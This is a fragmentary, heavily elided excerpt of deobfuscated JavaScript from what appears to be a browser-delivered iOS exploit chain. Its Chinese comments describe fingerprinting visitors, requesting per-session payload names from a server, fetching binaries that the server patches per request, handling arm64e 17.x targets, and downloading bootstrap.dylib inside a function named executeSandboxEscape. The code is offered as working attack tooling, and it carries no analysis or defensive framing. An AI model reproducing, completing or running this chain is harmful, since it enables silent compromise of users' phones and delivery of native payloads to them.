...
function YA() {/* Original: YA → resolveSymbols */
    ...
    const E = {
        ...
        // 15x iframe-c：向服务端签发会话专属文件名（JS 上报 → 服务端按名归因，无 IP 回退）
        async issuePerClassName(base) {
            const ev = (window.__runtimeEventId && window.__runtimeEventId()) || "";
            if (!ev) return base + ".min.js";   // 无 eventId：退回原名（服务端将 404——fail closed）
        ...
        fetchBin(url) {
            // 15x: 请求附带渠道/指纹/集成ID/事件ID（服务端按请求 patch 桥 dylib 配置，对齐 18 线 getJS 模式）
            try {
        ...
        async buildContainer(hashName) {
            ...
            // 15x iframe-c：等长替换改写 per-class 名字（前24位=base前缀+后16位=token，总长 49 不变——原生零感知）
            // 对照实验开关：false = 原名喂送（A 轮对照）；true = token 名（B 轮，当前生产形态）
            const _ENTRY4_REWRITE_ENABLED = true;
            for (let i = 0; i < entries.length; i++) {
                const e = entries[i];
                if (!e.file) continue;
                // 配置件统一按 type 7 扫（含 40hex.min.js 名字记录）：
                //   5 条目组 = entry4_type0x07；6 条目组(extended) = entry5_type0x07；
                //   7 条目组(arm64e 17.x 段) = entry6_type0x07 —— 不再按文件名写死 entry4。
...
function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
    ...
    return g = (() => {
        ...
        // 对齐 18 线：bootstrap.dylib 下载带 ctx（页面层资源下载绑定）
